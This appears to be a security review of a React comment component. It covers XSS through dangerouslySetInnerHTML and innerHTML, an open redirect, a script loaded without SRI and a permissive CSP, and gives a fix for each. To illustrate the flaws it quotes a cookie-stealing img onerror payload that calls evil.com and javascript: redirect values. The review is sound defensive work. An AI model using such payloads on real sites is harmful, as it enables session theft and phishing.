# Security Review: CommentSection

## Vulnerabilities Found

### 1. XSS via `dangerouslySetInnerHTML` (CRITICAL)

**Rule violated**: *Never innerHTML/document.write with user input, use textContent* | *Sanitize HTML via DOMPurify with explicit allowed tags*

```typescript
{comments.map(c => <div key={c.id} dangerouslySetInnerHTML={{ __html: c.body }} />)}
```

User-supplied `comment.body` is rendered as raw HTML with zero sanitization. An attacker posts `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">` and every visitor's session is hijacked.

**Fix**: Sanitize with DOMPurify before rendering, or use plain text.

```typescript
import DOMPurify from 'dompurify';

const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'];
const ALLOWED_ATTR = ['href'];

// Option A: sanitize
<div key={c.id} dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(c.body, { ALLOWED_TAGS, ALLOWED_ATTR })
}} />

// Option B: plain text (preferred if rich text is not required)
<div key={c.id}>{c.body}</div>
```

### 2. XSS via `div.innerHTML` in `renderComment` (CRITICAL)

**Rule violated**: *Never innerHTML/document.write with user input, use textContent*

```typescript
const div = document.createElement('div');
div.innerHTML = comment.body;
```

Same vulnerability as above, but via imperative DOM manipulation. Even though `renderComment` is not called in the JSX return, its existence is a latent exploit waiting to be wired up.

**Fix**: Use `textContent` or DOMPurify.

```typescript
div.textContent = comment.body;
// or
div.innerHTML = DOMPurify.sanitize(comment.body, { ALLOWED_TAGS, ALLOWED_ATTR });
```

### 3. Open Redirect (HIGH)

**Rule violated**: *Sanitize URLs: allow only http/https protocols*

```typescript
const profileUrl = new URLSearchParams(window.location.search).get('redirect');
if (profileUrl) window.location.href = profileUrl;
```

An attacker crafts `?redirect=javascript:alert(document.cookie)` or `?redirect=https://evil-phishing-site.com/login` and distributes the link. Victims trust the domain and click through.

**Fix**: Validate against an allowlist of origins or restrict to same-origin paths.

```typescript
const profileUrl = new URLSearchParams(window.location.search).get('redirect');
if (profileUrl) {
  try {
    const url = new URL(profileUrl, window.location.origin);
    const allowedOrigins = [window.location.origin];
    if (allowedOrigins.includes(url.origin)) {
      window.location.href = url.toString();
    }
  } catch {
    // invalid URL, ignore
  }
}
```

### 4. Unsafe External Script Without SRI (HIGH)

**Rule violated**: *Use SRI for external scripts*

```tsx
<script src="https://cdn.analytics.com/v3/tracker.js"></script>
```

If the CDN is compromised or DNS-hijacked, an attacker controls arbitrary JS execution on every page load. No Subresource Integrity hash is present to detect tampering.

**Fix**: Add `integrity` and `crossOrigin` attributes.

```html
<script
  src="https://cdn.analytics.com/v3/tracker.js"
  integrity="sha384-<hash-of-known-good-file>"
  crossOrigin="anonymous"
></script>
```

Note: Inline `<script>` tags in React JSX do not execute. If analytics is truly needed, load it via a proper script loader or in the document `<head>` with SRI.

### 5. Dangerously Permissive CSP (CRITICAL)

**Rule violated**: *Use nonce/hash-based CSP, deploy report-only first*

```
Content-Security-Policy: default-src *; script-src 'unsafe-inline' 'unsafe-eval' *;
```

This CSP is security theater. It permits:
- **Any origin** for all resource types (`default-src *`)
- **Inline scripts** (`unsafe-inline`) -- attacker-injected `<script>` tags execute freely
- **eval** (`unsafe-eval`) -- enables `eval()`, `Function()`, `setTimeout('string')` exploitation
- **Any script origin** (`*`) -- attacker can load scripts from any domain

This CSP provides zero protection against any of the XSS vulnerabilities listed above.

**Fix**: Deploy a strict nonce-based CSP.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  report-uri /csp-report;
```

Deploy as `Content-Security-Policy-Report-Only` first to identify breakage before enforcing.

## Summary

| # | Vulnerability | Severity | OWASP Category |
|---|---|---|---|
| 1 | XSS via `dangerouslySetInnerHTML` | Critical | A03:2021 Injection |
| 2 | XSS via `innerHTML` | Critical | A03:2021 Injection |
| 3 | Open redirect | High | A01:2021 Broken Access Control |
| 4 | External script without SRI | High | A08:2021 Software and Data Integrity Failures |
| 5 | Permissive CSP | Critical | A05:2021 Security Misconfiguration |

All five issues are exploitable in combination: the permissive CSP removes the last safety net that could have mitigated the XSS and open redirect vulnerabilities. Fix the CSP first as defense-in-depth, then remediate each injection point.
